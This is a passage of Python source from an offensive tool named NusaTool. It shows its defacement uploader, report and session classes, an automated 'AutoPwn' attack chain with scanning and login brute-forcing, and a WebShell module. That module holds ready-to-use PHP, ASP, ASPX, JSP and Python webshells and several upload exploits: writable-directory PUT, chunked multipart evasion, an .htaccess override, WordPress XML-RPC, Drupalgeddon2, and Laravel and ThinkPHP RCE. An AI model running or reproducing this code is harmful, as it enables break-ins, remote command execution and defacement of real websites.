                    r = requests.put(target, data=content, headers=hdrs, timeout=10, verify=False)
                    if r.status_code in (200, 201, 204):
                        r2 = self.bypass.get(target, timeout=8)
                        if r2.status_code == 200 and len(r2.text) > 50:
                            print(f"  {G}[✔]{N} {BOLD}PUT SUCCESS{N} {Y}{target}{N}")
                            uploaded.append({"method": "PUT", "url": target})
                except Exception as e:
                    print(f"  {R}[✘]{N} PUT failed: {e}")

        # 2) Upload endpoint — POST multipart
        for v in self.vulns:
            if "Upload Endpoint" in v["type"]:
                ep_url = v["url"]
                try:
                    files = {"file": (fname, content, "text/html")}
                    r = requests.post(ep_url, files=files, timeout=10, verify=False,
                        headers={"User-Agent": random.choice(self.bypass.ua_list)})
                    if r.status_code in (200, 201, 204):
                        verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                        r2 = requests.get(verify_url, timeout=8, verify=False)
                        if r2.status_code == 200 and len(r2.text) > 50:
                            print(f"  {G}[✔]{N} {BOLD}POST UPLOAD{N} {Y}{verify_url}{N}")
                            uploaded.append({"method": "POST", "url": verify_url})
                except Exception as e:
                    print(f"  {R}[✘]{N} POST upload failed: {e}")

        # 3) Upload bypass — re-use same technique
        for v in self.vulns:
            if "Upload Bypass" in v["type"]:
                ep_url = v["url"]
                base = ep_url.rsplit("/", 1)[0]
                if not base.startswith("http"):
                    continue
                try:
                    files = {"file": (fname, content, "image/jpeg")}
                    r = requests.post(base + "/", files=files, timeout=10, verify=False,
                        headers={"User-Agent": random.choice(self.bypass.ua_list)})
                    if r.status_code in (200, 201, 204):
                        verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                        r2 = requests.get(verify_url, timeout=8, verify=False)
                        if r2.status_code == 200 and len(r2.text) > 50:
                            print(f"  {G}[✔]{N} {BOLD}BYPASS UPLOAD{N} {Y}{verify_url}{N}")
                            uploaded.append({"method": "BYPASS", "url": verify_url})
                except Exception as e:
                    print(f"  {R}[✘]{N} Bypass upload failed: {e}")

        # 4) Upload form (Kleeja / CMS forms) — interactive captcha if needed
        for v in self.vulns:
            if "Upload Form" in v["type"]:
                res = self._submit_form(content, fname, getattr(self, '_captcha_answer', None))
                if res:
                    uploaded.append(res)

        print(f"\n  {D}{'─'*50}{N}")
        if uploaded:
            print(f"  {G}{BOLD}✔ {len(uploaded)} file(s) deployed!{N}")
            ptable(["METHOD", "URL"], [[u["method"], u["url"]] for u in uploaded], colors=[G]*len(uploaded))
        else:
            print(f"  {R}✘{N} Could not upload deface content.")
        print()
        return uploaded


# ══════════════════════════════════════════════════════
#  REPORT GENERATOR (JSON + HTML)
# ══════════════════════════════════════════════════════

class ReportGenerator:
    def __init__(self):
        self.findings = []
        self.target = ""
        self.start_time = datetime.datetime.now()
        self.phases = []

    def add(self, finding):
        self.findings.append(finding)

    def add_phase(self, name, status, detail=""):
        self.phases.append({"name": name, "status": status, "detail": detail, "time": (datetime.datetime.now()-self.start_time).total_seconds()})

    def generate_json(self, data=None, f="nusatool_report.json"):
        d = data or {"target": self.target, "findings": self.findings, "phases": self.phases, "generated": str(self.start_time)}
        with open(f, "w") as fp: json.dump(d, fp, indent=2, default=str)
        print(f"  {G}✔{N} JSON report saved to {Y}{f}{N}")

    def generate_csv(self, f="nusatool_report.csv"):
        import csv
        with open(f, "w", newline="") as fp:
            w = csv.writer(fp)
            w.writerow(["Type", "Target", "Detail", "Severity", "Timestamp"])
            for v in self.findings:
                w.writerow([v.get("type",""), v.get("target",""), v.get("detail",""), v.get("severity","info"), v.get("time","")])
        print(f"  {G}✔{N} CSV report saved to {Y}{f}{N}")

    def generate_html(self, f="nusatool_report.html", data=None):
        ts = self.start_time.strftime("%Y-%m-%d %H:%M:%S")
        d = data or {"target": self.target, "findings": self.findings, "phases": self.phases}
        vulns = d.get("findings") or []
        phases = d.get("phases") or []
        sev_dist = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
        findings_rows = ""
        for i, v in enumerate(vulns, 1):
            sev = v.get("severity","info").lower()
            sev_dist[sev] = sev_dist.get(sev,0)+1
            badge = {"critical":"badge-crit","high":"badge-high","medium":"badge-med","low":"badge-low","info":"badge-info"}.get(sev,"badge-info")
            findings_rows += f"<tr><td>{i}</td><td>{escape(v.get('type','?'))}</td><td>{escape(v.get('target',''))}</td><td>{escape(v.get('detail','')[:80])}</td><td><span class='{badge}'>{sev.title()}</span></td></tr>\n"
        phases_rows = ""
        for p in phases:
            sc = {"ok":"🟢","fail":"🔴","skip":"⏭️","warn":"🟡"}.get(p.get("status",""),"⚪")
            phases_rows += f"<tr><td>{sc}</td><td>{escape(p.get('name',''))}</td><td>{escape(p.get('detail',''))}</td><td>{p.get('time',0):.1f}s</td></tr>\n"
        # Mini chart bars
        total = sum(sev_dist.values()) or 1
        bars = "".join(f"<div style='display:flex;align-items:center;margin:4px 0'><span style='width:80px;color:#8899aa'>{k.title()}</span><div style='flex:1;background:#1a1f3a;border-radius:4px;height:20px'><div style='width:{v/total*100}%;background:{'#ff2222' if k=='critical' else '#ff4444' if k=='high' else '#ffaa00' if k=='medium' else '#44cc44' if k=='low' else '#6688cc'};height:20px;border-radius:4px'></div></div><span style='width:40px;text-align:right;color:#e0e0e0'>{v}</span></div>" for k,v in sev_dist.items())
        html = f"""<!DOCTYPE html><html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NusaTool Report</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0;font-size:14px}}
.container{{max-width:1100px;margin:0 auto;padding:20px}}
.hdr{{background:linear-gradient(135deg,#1a1f3a,#0d1b2a);padding:40px;border-radius:12px;text-align:center;border:1px solid #2a3f5f;margin-bottom:20px}}
.hdr h1{{color:#00d4ff;font-size:2.2em;letter-spacing:2px}}.hdr p{{color:#8899aa;margin-top:5px}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-top:15px}}
.stat-box{{background:#1a1f3a;padding:15px;border-radius:8px;text-align:center;border:1px solid #2a3f5f}}
.stat-box .num{{font-size:1.8em;font-weight:700;color:#00d4ff}}
.stat-box .lbl{{color:#8899aa;font-size:.85em;margin-top:4px}}
.section{{background:#111827;border:1px solid #1e293b;border-radius:10px;padding:25px;margin:20px 0}}
.section h2{{color:#00d4ff;border-bottom:1px solid #1e293b;padding-bottom:10px;margin-bottom:15px}}
table{{width:100%;border-collapse:collapse}}
th{{background:#1a1f3a;color:#00d4ff;padding:10px 12px;text-align:left;font-size:.85em;text-transform:uppercase;letter-spacing:1px}}
td{{padding:8px 12px;border-bottom:1px solid #1e293b;font-size:.9em}}
tr:hover td{{background:#1a1f3a70}}
.badge-crit,.badge-high,.badge-med,.badge-low,.badge-info{{display:inline-block;padding:2px 10px;border-radius:10px;font-size:.8em;font-weight:600}}
.badge-crit{{background:#ff2222;color:#fff}}
.badge-high{{background:#ff4444;color:#fff}}
.badge-med{{background:#ffaa00;color:#1a1f3a}}
.badge-low{{background:#44cc44;color:#fff}}
.badge-info{{background:#6688cc;color:#fff}}
.footer{{text-align:center;padding:30px;color:#445;font-size:.8em}}
pre{{background:#1a1f3a;padding:12px;border-radius:6px;overflow-x:auto;color:#00d4ff;font-size:.85em}}
@media(max-width:600px){{.grid{{grid-template-columns:1fr 1fr}}}}</style></head>
<body><div class="container">
<div class="hdr"><h1>⬡ NusaTool</h1><p>Security Assessment Report</p><p style="font-size:.85em;margin-top:8px;color:#556">{ts}</p></div>
<div class="grid">
<div class="stat-box"><div class="num">{len(vulns)}</div><div class="lbl">Total Findings</div></div>
<div class="stat-box"><div class="num">{sum(1 for v in vulns if v.get('severity','').lower() in ('critical','high'))}</div><div class="lbl">Critical/High</div></div>
<div class="stat-box"><div class="num">{len(phases)}</div><div class="lbl">Phases Run</div></div>
<div class="stat-box"><div class="num">{escape(d.get('target','—'))}</div><div class="lbl">Target</div></div>
</div>
{bars and '<div class=section><h2>Severity Distribution</h2>'+bars+'</div>' or ''}
<div class="section"><h2>Findings</h2>
<table><thead><tr><th>#</th><th>Type</th><th>Target</th><th>Detail</th><th>Severity</th></tr></thead>
<tbody>{findings_rows or '<tr><td colspan="5" style="text-align:center;color:#8899aa;padding:20px">No findings recorded</td></tr>'}</tbody></table></div>
{phases_rows and f'<div class=section><h2>Phase Timeline</h2><table><thead><tr><th></th><th>Phase</th><th>Detail</th><th>Time</th></tr></thead><tbody>{phases_rows}</tbody></table></div>' or ''}
<div class="section"><h2>Modules</h2><table><thead><tr><th>Module</th><th>Description</th></tr></thead><tbody>
<tr><td>AutoPwn</td><td>Automated full pentest — port scan, web scan, CMS, LFI, SQLi, brute-force, shell, report</td></tr>
<tr><td>WebShell</td><td>10 upload techniques — PUT, POST multipart, JSON, .htaccess, WordPress XML-RPC, Drupalgeddon2, Laravel/ThinkPHP, PHPUnit, path traversal, .user.ini</td></tr>
<tr><td>SQL Auto</td><td>UNION-based injection — column count, version, tables, columns, data dump</td></tr>
<tr><td>Blind SQLi</td><td>Boolean/time-based binary search extraction</td></tr>
<tr><td>LFI2RCE</td><td>Log poisoning, php://filter, /proc/self/environ</td></tr>
<tr><td>CMS Exploit</td><td>WordPress, Joomla, Drupal vulnerability checks</td></tr>
<tr><td>Service Brute</td><td>SSH, FTP, MySQL, PostgreSQL, Telnet brute-force with threading</td></tr>
<tr><td>Deface</td><td>Upload endpoint discovery, PUT writable check, form-based upload, webshell deface</td></tr>
<tr><td>Reverse Shell</td><td>15+ payload generators — bash, python, php, nc, powershell, perl, ruby, socat, node, etc.</td></tr>
</tbody></table></div>
<div class="footer">NusaTool v{VERSION} | {ts} | Generated by NusaTool Security Framework</div>
</div></body></html>"""
        with open(f, "w") as fp: fp.write(html)
        print(f"  {G}✔{N} HTML report saved to {Y}{f}{N}")

    def generate(self, f="nusatool_report.html", data=None):
        self.generate_html(f, data)


# ══════════════════════════════════════════════════════
#  SESSION MANAGER
# ══════════════════════════════════════════════════════

class SessionManager:
    def __init__(self, path="nusatool_session.json"):
        self.path = path
        self.data = {"target": "", "started": "", "phases": [], "findings": [], "shells": [], "creds": [], "notes": ""}

    def save(self):
        with open(self.path, "w") as f: json.dump(self.data, f, indent=2, default=str)

    def load(self):
        if os.path.exists(self.path):
            with open(self.path) as f: self.data = json.load(f)
            return True
        return False

    def add_phase(self, name, status, detail=""):
        self.data["phases"].append({"name": name, "status": status, "detail": detail, "time": datetime.datetime.now().isoformat()})
        self.save()

    def add_finding(self, ftype, target, detail, severity="info"):
        self.data["findings"].append({"type": ftype, "target": target, "detail": detail, "severity": severity, "time": datetime.datetime.now().isoformat()})
        self.save()

    def add_cred(self, service, host, user, pwd):
        self.data["creds"].append({"service": service, "host": host, "username": user, "password": pwd})
        self.save()

    def status(self):
        return f"  {C}📁 Session{N}  phases:{len(self.data['phases'])} findings:{len(self.data['findings'])} creds:{len(self.data['creds'])}"

    def reset(self):
        self.data = {"target": "", "started": datetime.datetime.now().isoformat(), "phases": [], "findings": [], "shells": [], "creds": [], "notes": ""}


# ══════════════════════════════════════════════════════
#  AUTOPWN — FULL AUTO HACK (8 phases)
# ══════════════════════════════════════════════════════

class AutoPwn:
    def __init__(self, target, wordlist_dir=None, ports="1-1024", threads=20):
        self.target = target; self.ports = ports; self.threads = threads
        self.wd = wordlist_dir or os.path.join(os.path.dirname(__file__), "wordlists")
        self.domain = None; self.base_url = None
        self.results = {"recon": {}, "network": {}, "web_vulns": [], "cors": [], "csrf": [], "cve": [], "dirs": [], "creds": []}
        self.all_vulns = []; self.banners = []; self.bypass = None; self.t0 = time.time()
        if self.target.startswith("http"):
            self.base_url = self.target.rstrip("/")
            self.domain = urlparse(self.target).netloc.split(":")[0]
        else:
            self.domain = self.target; self.base_url = f"http://{self.target}"

    def _elapsed(self): return f"{time.time()-self.t0:.1f}s"

    def run(self):
        header("AUTOPWN v2 — 8-PHASE AUTO PENTEST")
        print(f"  {C}◉{N} Target: {Y}{self.target}{N}  |  Domain: {Y}{self.domain}{N}  |  URL: {Y}{self.base_url}{N}")
        print(f"  {D}{'─'*50}{N}")

        # PHASE 1: RECON
        print(f"\n  {BOLD}{R}╔═══ PHASE 1: RECON (whois → dns → subdomain) ═══╗{N}")
        try: WhoisLookup(self.domain).run()
        except: pass
        try: self.results["recon"]["dns"] = DNSRecon(self.domain).run()
        except: pass
        try:
            wl = os.path.join(self.wd,"subdomains.txt")
            self.results["recon"]["subdomains"] = SubdomainEnumerator(self.domain, wl if os.path.exists(wl) else None, self.threads).run()
        except: pass

        # PHASE 2: WAF BYPASS
        print(f"\n  {BOLD}{R}╔═══ PHASE 2: WAF DETECTION ═══════════════════════════╗{N}")
        self.bypass = BypassEngine(self.base_url)
        print(f"  {self.bypass.info()}{N}")

        # PHASE 3: NETWORK
        print(f"\n  {BOLD}{R}╔═══ PHASE 3: NETWORK (portscan → service) ═══════════╗{N}")
        try:
            if not self.target.startswith("http"):
                self.results["network"]["ports"] = PortScanner(self.domain, self.ports).run()
                if self.results["network"]["ports"]:
                    ps = ",".join(str(p) for p,_ in self.results["network"]["ports"])
                    self.results["network"]["services"] = ServiceDetector(self.domain, ps).run()
                    self.banners = self.results["network"]["services"]
        except: pass

        # PHASE 4: CVE CHECK
        print(f"\n  {BOLD}{R}╔═══ PHASE 4: CVE CHECKER ══════════════════════════════╗{N}")
        try:
            checker = CVEChecker()
            self.results["cve"] = checker.scan_from_banners(self.banners)
            for v in self.results["cve"]:
                self.all_vulns.append({"type": "CVE", "param": v["service"], "payload": v["cve"], "severity": v["severity"]})
        except: pass

        # PHASE 5: URL VULN SCAN
        print(f"\n  {BOLD}{R}╔═══ PHASE 5: WEB VULNS (urlscan → xss → sqli) ════════╗{N}")
        try:
            self.results["web_vulns"] = URLScanner(self.base_url, self.bypass).scan()
            self.all_vulns.extend(self.results["web_vulns"])
        except: pass
        try:
            for v in XSSScanner(self.base_url, "GET", None, self.bypass).run():
                self.all_vulns.append({"type":"XSS","param":v["parameter"],"payload":v["payload"]})
        except: pass
        try:
            for v in SQLiScanner(self.base_url, "GET", None, self.bypass).run():
                self.all_vulns.append({"type":"SQLi","param":v["parameter"],"payload":v["payload"]})
        except: pass

        # PHASE 6: CORS + CSRF
        print(f"\n  {BOLD}{R}╔═══ PHASE 6: CORS + CSRF ════════════════════════════════╗{N}")
        try:
            self.results["cors"] = CORSScanner(self.base_url, self.bypass).scan()
            self.all_vulns.extend({"type":"CORS","param":v["origin"],"payload":v["issue"]} for v in self.results["cors"])
        except: pass
        try:
            self.results["csrf"] = CSRFScanner(self.base_url, self.bypass).scan()
            self.all_vulns.extend({"type":"CSRF","param":f"Form #{v['form']}","payload":v["issue"]} for v in self.results["csrf"])
        except: pass

        # PHASE 7: DIR BUST
        print(f"\n  {BOLD}{R}╔═══ PHASE 7: DIRECTORY BUSTING ══════════════════════════╗{N}")
        try:
            wl = os.path.join(self.wd,"common.txt")
            if os.path.exists(wl):
                self.results["dirs"] = DirBruteforcer(self.base_url, wl, None, self.threads, self.bypass).run()
        except: pass

        # PHASE 8: BRUTE FORCE (if login detected)
        uf = os.path.join(self.wd,"usernames.txt")
        pf = os.path.join(self.wd,"passwords.txt")
        if os.path.exists(uf) and os.path.exists(pf) and "login" in self.base_url.lower():
            print(f"\n  {BOLD}{R}╔═══ PHASE 8: BRUTE FORCE ═══════════════════════════════╗{N}")
            try: self.results["creds"] = LoginBruteforcer(self.base_url, uf, pf, bypass=self.bypass).run()
            except: pass

        # SUMMARY
        elapsed = time.time() - self.t0
        print(f"\n  {BOLD}{R}{'═'*55}{N}")
        print(f"  {BOLD}{R}  AUTOPWN COMPLETE  ({elapsed:.1f}s){N}")
        print(f"  {BOLD}{R}{'═'*55}{N}")
        if self.all_vulns:
            print(f"\n  {R}◉{N} Vulnerabilities: {BOLD}{R}{len(self.all_vulns)}{N}")
            for v in self.all_vulns[:20]:
                print(f"    {R}[!]{N} {Y}{v.get('type','?')}{N}  {D}→ {v.get('param','?')}{N}")
            if len(self.all_vulns) > 20: print(f"    {D}... and {len(self.all_vulns)-20} more{N}")
        else: print(f"\n  {G}◉{N} Vulnerabilities: {G}None{N}")
        print(f"  {G}◉{N} Open ports : {len(self.results.get('network',{}).get('ports',[]))}")
        print(f"  {C}◉{N} Subdomains : {len(self.results.get('recon',{}).get('subdomains',[]))}")
        print(f"  {M}◉{N} Dirs found : {len(self.results.get('dirs',[]))}")

        # Auto export
        ReportGenerator().generate_html("autopwn_report.html", {"vulns": self.all_vulns})
        ReportGenerator().generate_json({"results": self.results, "vulns": self.all_vulns, "elapsed": elapsed}, "autopwn_report.json")
        print()


# ══════════════════════════════════════════════════════
#  WEBSHELL GENERATOR + UPLOADER (10+ techniques)
# ══════════════════════════════════════════════════════

class WebShell:
    SHELLS = {
        "php": """<?php
ob_clean();header('Content-Type: text/plain');
$cmd=$_REQUEST['cmd']??'id';
echo shell_exec($cmd);
exit;
?>""",
        "php_stealth": """<?php @eval($_POST['c']);?>""",
        "php_short": """<?php ob_clean();header('Content-Type: text/plain');echo shell_exec($_GET['cmd']??'id');exit;?>""",
        "php_image": """GIF89a<?php ob_clean();header('Content-Type: text/plain');system($_GET['cmd']);exit;?>""",
        "asp": """<%
Dim c:c=Request("cmd"):If c<>"" Then:Set o=CreateObject("WScript.Shell"):Set e=o.Exec("cmd /c "&c):Response.Write("<pre>"&e.StdOut.ReadAll()&"</pre>"):End If
%>""",
        "aspx": """<%@ Page Language="C#" validateRequest="false" %>
<script runat="server">protected void Page_Load(object s,EventArgs e){
string c=Request["cmd"];if(c!=null){
System.Diagnostics.Process p=new System.Diagnostics.Process();
p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;
p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;
p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
}}</script>""",
        "jsp": """<%
String c=request.getParameter("cmd");
if(c!=null){
Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});
java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
String l;out.print("<pre>");while((l=r.readLine())!=null)out.println(l);out.print("</pre>");
}%>""",
        "python": """#!/usr/bin/env python3
import cgi,s,subprocess as sp
print("Content-Type: text/html\\n")
f=cgi.FieldStorage();c=f.getvalue("cmd","id")
print("<pre>"+sp.getoutput(c)+"</pre>")""",
    }

    UPLOAD_PATHS = [
        "", "/uploads", "/images", "/img", "/assets", "/files", "/media",
        "/tmp", "/admin", "/backup", "/wp-content/uploads", "/wp-content",
        "/wp-admin", "/upload", "/storage", "/userfiles", "/data",
        "/include", "/lib", "/css", "/js", "/vendor", "/public",
        "/resources", "/static", "/content", "/file", "/documents",
        "/download", "/attachments", "/photos", "/pictures", "/pics",
        "/files/images", "/uploads/images", "/upload/files",
        "/assets/upload", "/media/upload", "/images/upload",
        "/wp-content/themes", "/wp-content/plugins",
        "/wp-content/uploads/2024", "/wp-content/uploads/2025",
        "/wp-content/uploads/2026",
    ]

    UPLOAD_ENDPOINTS = [
        "/upload.php", "/upload_file.php", "/uploadfile.php",
        "/file.php", "/files.php", "/media.php", "/api/upload",
        "/api/v1/upload", "/api/file", "/api/v1/file",
        "/wp-admin/async-upload.php", "/wp-content/plugins/",
        "/admin/upload.php", "/includes/upload.php",
        "/editor/upload.php", "/ckfinder/core/connector/php/connector.php",
        "/fckeditor/editor/filemanager/upload/php/upload.php",
        "/simpla/index.php", "/Upload", "/uploader",
        "/upload_handler.php", "/userfiles/upload.php",
        "/assets/upload.php", "/uploads/upload.php",
        "/filemanager/upload.php", "/elfinder/php/connector.php",
        "/api/upload.php", "/rest/api/upload",
        "/index.php/upload", "/?rest_route=/upload",
    ]

    def __init__(self, url, bypass=None):
        self.raw = url
        parsed = urlparse(url)
        self.scheme = parsed.scheme
        self.host = parsed.netloc
        self.base = f"{self.scheme}://{self.host}"
        self.script_path = parsed.path.rstrip("/") if parsed.path else ""
        self.dir_path = self.script_path.rsplit("/", 1)[0] if "/" in self.script_path else ""
        self.bypass = bypass or BypassEngine(url)
        self.uploaded = []
        self.shell = None

    def _sh(self, t="php", fn=None):
        c = self.SHELLS.get(t)
        if not c: return None
        if not fn:
            e = {"php_stealth":"php","php_short":"php","php_image":"php","asp":"asp","aspx":"aspx","jsp":"jsp","python":"py"}.get(t, t)
            fn = f"nusa_{random.randint(10000,99999)}.{e}"
        return {"fn": fn, "code": c, "type": t}

    def _vfy(self, url):
        try:
            r = requests.get(url, timeout=4, verify=False)
            if r.status_code != 200: return False
            t = r.text.strip()
            if not t: return False
            if t.startswith("<!DOCTYPE") or t.startswith("<html"): return False
            return True
        except: return False

    # ── TECHNIQUE 1: PUT to writable dirs ──
    def _try_put(self, shell):
        writable = self._find_writable()
        if not writable: return None
        url = writable.rstrip("/") + "/" + shell["fn"]
        hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list), "Content-Type": "text/plain"}
        try:
            r = requests.put(url, data=shell["code"], headers=hdrs, timeout=8, verify=False)
            if r.status_code in (200,201,204) and self._vfy(url):
                return url
        except: pass
        return None

    def _find_writable(self):
        for d in self.UPLOAD_PATHS:
            for base in [self.base + self.dir_path, self.base]:
                if "?" in base: continue
                tu = base.rstrip("/") + d.rstrip("/") + "/nusa_tx_" + str(random.randint(1000,9999)) + ".txt"
                try:
                    hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list)}
                    r = requests.put(tu, data="nusa", headers=hdrs, timeout=4, verify=False)
                    if r.status_code in (200,201,204) and self._vfy(tu):
                        return base.rstrip("/") + d
                except: pass
        return None

    def _rand_boundary(self):
        return "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

    def _rand_ct(self):
        return random.choice(["image/jpeg", "image/png", "image/gif", "application/octet-stream", "text/plain"])

    def _chunked_post(self, url, data, headers):
        """Send with random chunked encoding."""
        try:
            chunks = [data[i:i+random.randint(4,16)] for i in range(0, len(data), random.randint(4,16))]
            body = "".join(f"{len(c):x}\r\n{c}\r\n" for c in chunks) + "0\r\n\r\n"
            hdrs = {**headers, "Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
            return requests.post(url, data=body, headers=hdrs, timeout=6, verify=False)
        except: return None

    # ── TECHNIQUE 2: POST multipart to endpoints ──
    def _try_post_endpoints(self, shell):
        base_clean = self.base + self.dir_path
        field_names = ["file", "upload", "image", "Filedata", "userfile", "images", "photo", "qqfile", "file_upload", "myfile"]
        ct_types = ["image/jpeg", "image/png", "image/gif", "application/x-php", "application/octet-stream"]
        for base in set([base_clean, self.base]):
            for ep in self.UPLOAD_ENDPOINTS:
                fn = random.choice(field_names)
                ct = random.choice(ct_types)
                boundary = self._rand_boundary()
                hdrs = {**self.bypass.bypass_headers,
                        "User-Agent": random.choice(self.bypass.ua_list),
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "Accept": random.choice(["*/*", "text/html", "application/json"]),
                        "X-Requested-With": random.choice(["XMLHttpRequest", ""])}
                body = (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"{fn}\"; filename=\"{shell['fn']}\"\r\n"
                    f"Content-Type: {ct}\r\n\r\n"
                    f"{shell['code']}\r\n"
                    f"--{boundary}--\r\n"
                )
                try:
                    r = requests.post(base+ep, data=body, headers=hdrs, timeout=6, verify=False)
                    if r.status_code in (200,201,204):
                        for test_base in [base, self.base]:
                            vu = test_base.rstrip("/") + "/" + shell["fn"]
                            if self._vfy(vu): return vu
                except: pass
        return None

    # ── TECHNIQUE 2b: POST multipart with chunked encoding ──
    def _try_post_chunked(self, shell):
        base_clean = self.base + self.dir_path
        for base in set([base_clean, self.base]):
            for ep in ["/upload.php", "/api/upload", "/upload"]:
                boundary = self._rand_boundary()
                body = (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"file\"; filename=\"{shell['fn']}\"\r\n"
                    f"Content-Type: image/jpeg\r\n\r\n"
                    f"{shell['code']}\r\n"
                    f"--{boundary}--\r\n"
                )
                chunks = [body[i:i+random.randint(8,32)] for i in range(0, len(body), random.randint(8,32))]
                chunked_body = "".join(f"{len(c):x}\r\n{c}\r\n" for c in chunks) + "0\r\n\r\n"
                hdrs = {**self.bypass.bypass_headers,
                        "User-Agent": random.choice(self.bypass.ua_list),
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "Transfer-Encoding": "chunked"}
                try:
                    r = requests.post(base+ep, data=chunked_body, headers=hdrs, timeout=8, verify=False)
                    if r.status_code in (200,201,204):
                        vu = base.rstrip("/") + "/" + shell["fn"]
                        if self._vfy(vu): return vu
                except: pass
        return None

    # ── TECHNIQUE 3: POST with form field ──
    def _try_post_form(self, shell):
        for base in [self.base, self.base + self.dir_path]:
            if "?" in base: continue
            for ep in ["", "/upload", "/save", "/index.php", "/api"]:
                for fn in ["file", "upload", "image", "Filedata", "userfile", "files[]", "photo", "file_upload", "user_file"]:
                    try:
                        r = requests.post(base+ep,
                            data={fn: (shell["fn"], shell["code"])},
                            timeout=6, verify=False,
                            headers={**self.bypass.bypass_headers,
                                     "User-Agent": random.choice(self.bypass.ua_list),
                                     "Content-Type": "multipart/form-data; boundary=" + self._rand_boundary()})
                        if r.status_code in (200,201,204):
                            vu = base.rstrip("/") + "/" + shell["fn"]
                            if self._vfy(vu): return vu
                    except: pass
        return None

    # ── TECHNIQUE 4: POST JSON with base64 data ──
    def _try_post_json(self, shell):
        b64 = base64.b64encode(shell["code"].encode()).decode()
        payloads = [
            {"file": shell["fn"], "data": b64, "action": "upload"},
            {"filename": shell["fn"], "content": b64, "type": "image"},
            {"name": shell["fn"], "base64": b64},
            {"image": shell["fn"], "data": f"data:image/jpeg;base64,{b64}"},
        ]
        for base in [self.base, self.base + self.dir_path]:
            for ep in ["/api/upload", "/api/v1/upload", "/upload", "/rest/upload"]:
                for p in payloads:
                    try:
                        r = requests.post(base+ep, json=p,
                            timeout=6, verify=False,
                            headers={"User-Agent": random.choice(self.bypass.ua_list), "Content-Type": "application/json"})
                        if r.status_code in (200,201,204):
                            vu = base.rstrip("/") + "/" + shell["fn"]
                            if self._vfy(vu): return vu
                    except: pass
        return None

    # ── TECHNIQUE 5: .htaccess + image bypass ──
    def _try_htaccess_bypass(self, shell):
        htaccess = "AddType application/x-httpd-php .png\nphp_value auto_prepend_fd none\n"
        for base in set([self.base, self.base + self.dir_path,
                         self.base+"/uploads", self.base+"/wp-content/uploads"]):
            try:
                requests.put(base+"/.htaccess", data=htaccess,
                    headers={"User-Agent": random.choice(self.bypass.ua_list)}, timeout=4, verify=False)
            except: pass
            try:
                r = requests.post(base+"/", files={"file": ("nusa_x.png", shell["code"], "image/png")},
                    timeout=6, verify=False,
                    headers={"User-Agent": random.choice(self.bypass.ua_list)})
                if r.status_code in (200,201,204) and self._vfy(base+"/nusa_x.png"):
                    return base+"/nusa_x.png"
            except: pass
        return None

    # ── TECHNIQUE 6: WordPress XML-RPC upload ──
    def _try_wp_xmlrpc(self, shell):
        wp_url = self.base + "/xmlrpc.php"
        try:
            r = requests.post(wp_url, data=f"<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                headers={"Content-Type": "text/xml"}, timeout=6, verify=False)
            if r.status_code != 200 or "methodName" not in (r.text or ""): return None
        except: return None
        b64 = base64.b64encode(shell["code"].encode()).decode()
        xml = f"""<?xml version="1.0"?>
<methodCall><methodName>wp.uploadFile</methodName><params><param><value><struct>
<member><name>name</name><value><string>{shell['fn']}</string></value></member>
<member><name>type</name><value><string>image/jpeg</string></value></member>
<member><name>bits</name><value><base64>{b64}</base64></value></member>
<member><name>overwrite</name><value><boolean>1</boolean></value></member>
</struct></value></param></params></methodCall>"""
        try:
            r = requests.post(wp_url, data=xml, headers={"Content-Type": "text/xml"}, timeout=8, verify=False)
            if r.status_code == 200:
                vu = self.base + "/wp-content/uploads/" + shell["fn"]
                if self._vfy(vu): return vu
                m = re.search(r'<url>\s*<!\[CDATA\[([^\]]+)\]\]>\s*</url>', r.text)
                if m: return m.group(1)
        except: pass
        return None

    # ── TECHNIQUE 7: Drupalgeddon2 RCE upload ──
    def _try_drupalgeddon2(self, shell):
        for form in ["user_register_form", "user_pass", "contact_site_form"]:
            try:
                r = requests.post(self.base + f"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                    data={"form_id": form, "_drupal_ajax": "1",
                          "mail[#post_render][]": "file_put_contents",
                          "mail[#markup]": f"{shell['fn']}|{base64.b64encode(shell['code'].encode()).decode()}"},
                    timeout=8, verify=False)
                if r.status_code == 200 and self._vfy(self.base + "/" + shell["fn"]):
                    return self.base + "/" + shell["fn"]
            except: pass
        return None

    # ── TECHNIQUE 8: Laravel/ThinkPHP debug RCE ──
    def _try_framework_rce(self, shell):
        fn = shell["fn"]
        code = shell["code"]
        b64 = base64.b64encode(code.encode()).decode()
        targets = [
            ("laravel-post", f"_ignition/execute-solution",
             {"solution_class": "Ignition\\Solutions\\MakeViewVariableOptionalSolution",
              "parameters": {"variableName": "nusa", "viewFile": fn}}),
            ("thinkphp-get", f"index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=" + fn + "&vars[1][]=" + urllib.parse.quote(code), None),
        ]
        for name, path, data in targets:
            try:
                if name.startswith("laravel"):
                    r = requests.post(self.base + "/" + path, json=data, timeout=6, verify=False)
                elif name.startswith("thinkphp"):
                    r = requests.get(self.base + "/" + path, timeout=6, verify=False)
                if r and r.status_code in (200, 201) and self._vfy(self.base + "/" + fn):
                    return self.base + "/" + fn
            except: pass
        try:
